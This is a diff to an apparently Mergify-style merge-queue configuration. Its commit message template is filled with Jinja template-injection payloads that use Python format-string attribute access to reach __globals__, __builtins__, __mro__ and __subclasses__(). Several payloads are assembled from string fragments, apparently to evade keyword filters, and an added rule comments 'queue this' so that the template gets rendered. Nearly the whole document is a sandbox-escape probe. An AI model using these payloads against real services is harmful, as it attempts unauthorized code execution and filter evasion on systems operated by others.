@@ -4,5 +4,23 @@ queue_rules:
     merge_conditions: []
     merge_method: squash
     commit_message_template: |
-      FMT_GLOB: {{ '{0.__globals__}'.format(dict) }}
-      FMT_BI: {{ '{0.__builtins__}'.format(dict) }}
+      FMT_KEYS: {{ '{0.keys}'.format(dict) }}
+      FMT_GET: {{ '{0.get}'.format(dict) }}
+      FMT_ITEMS: {{ '{0.items}'.format(dict) }}
+      FMT_UPDATE: {{ '{0.update}'.format(dict) }}
+      FMT_VALUES: {{ '{0.values}'.format(dict) }}
+      FMT_CLASS: {{ '{0.__class__}'.format(dict) }}
+      FMT_INIT: {{ '{0.__init__}'.format(dict) }}
+      DYN_CLASS: {{ '{0.' + ('_'*2 + 'class' + '_'*2) + '}'.format(dict) }}
+      DYN_GLOB: {{ '{0.' + ('_'*2 + 'globals' + '_'*2) + '}'.format(dict) }}
+      DYN_BI: {{ '{0.' + ('_'*2 + 'builtins' + '_'*2) + '}'.format(dict) }}
+      CHAIN_MRO: {{ '{0.__class__.__mro__}'.format(dict) }}
+      CHAIN_BI: {{ '{0.__init__.__globals__}'.format(dict) }}
+      DYN_CHAIN: {{ ('{0.' + ('_'*2+'class'+'_'*2) + '.' + ('_'*2+'mro'+'_'*2) + '}').format(dict) }}
+      DYN_SUBCLASS: {{ ('{0.' + ('_'*2+'class'+'_'*2) + '.' + ('_'*2+'subclasses'+'_'*2) + '()}').format(dict) }}
+pull_request_rules:
+  - name: queue trigger
+    conditions: []
+    actions:
+      comment:
+        message: queue this
